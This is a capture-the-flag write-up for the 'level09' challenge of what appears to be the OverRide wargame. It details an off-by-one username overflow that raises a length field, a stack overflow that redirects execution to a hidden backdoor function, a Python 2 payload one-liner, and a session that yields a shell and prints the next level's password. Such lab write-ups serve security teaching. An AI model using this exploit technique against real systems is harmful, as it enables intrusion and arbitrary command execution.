
level09
=======

```console
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```

* We have a *level09* executable and here is the [code](src/level09.c).
* Looking at the code, we notice:
  - `handle_msg()` initializes a structure containing a message buffer, a username and a maximum message length.
  - `set_username()` copies our username into a 40-byte buffer.
  - `set_msg()` copies our message using `strncpy()`, with a length stored in the structure.
  - `secret_backdoor()` is an unused function that reads a command and executes it with `system()`.
* The first vulnerability is in `set_username()`:
  ```c
  for (int i = 0; i <= 40 && input[i]; i++)
      username[i] = input[i];
  ```
  The username has only 40 bytes, but the loop copies up to 41 bytes. This is an **off-by-one overflow**.
* Looking at the memory layout:
  ```text
  Offset 0x00 - 0x8b : message[140]
  Offset 0x8c - 0xb3 : username[40]
  Offset 0xb4        : max_length = 140
  ```
  The 41st username byte overwrites the first byte of `max_length`.
  Since the original value is `0x0000008c`, we can overwrite its lowest byte with `0xff`:
  ```text
  Before: 0x0000008c = 140
  After:  0x000000ff = 255
  ```
* This becomes dangerous in `set_msg()`:
  ```c
  strncpy(data->message, input, data->max_length);
  ```
  The message buffer only holds 140 bytes, but we can now copy up to 255 bytes, allowing us to overwrite the saved return address.
* We need to find the offset to the return address. Looking at `handle_msg()` in the disassembly:
  ```asm
  sub rsp, 0xc0
  lea rax, [rbp-0xc0]
  ```
  The message buffer starts at `RBP - 0xc0`, and the saved return address is at `RBP + 8`.
  ```text
  0xc0 = 192 bytes
  Saved RBP = 8 bytes
  Offset = 192 + 8 = 200 bytes
  ```
  Our payload needs 200 bytes of padding before overwriting RIP.
* Instead of using shellcode, we can redirect execution to the existing `secret_backdoor()` function:
  ```c
  void secret_backdoor(void)
  {
      char command[128];

      fgets(command, sizeof(command), stdin);
      system(command);
  }
  ```
  The function is located at offset `0x88c` in the executable.
* However, PIE is enabled, meaning its absolute address can change between executions. We can inspect its runtime address in GDB:
  ```gdb
  (gdb) break handle_msg
  (gdb) run
  (gdb) p/x (void *)secret_backdoor
  ```
  We must account for PIE/ASLR before using this address outside GDB.
* Once we have a valid address, our payload will contain:
  ```text
  Username: [40 bytes padding][0xff]
  Message:  [200 bytes padding][secret_backdoor address]
  ```
* We can construct a test payload using Python 2:
  ```console
  $ python2 -c 'import struct; print "A"*40 + "\xff\n" + "B"*200 + struct.pack("<Q", [secret_backdoor address])' > /tmp/level09
  ```
  `struct.pack("<Q", ...)` converts the 64-bit address into little-endian bytes.
* We can test the payload with:
  ```console
  level09@OverRide:~$ cat /tmp/level09 - | ./level09
  --------------------------------------------
  |   ~Welcome to l33t-m$n ~    v1337        |
  --------------------------------------------
  >: Enter your username
  >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
  >>: >: Msg sent!
  /bin/sh
  whoami
  end
  cat /home/users/end/.pass               
  j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
  ```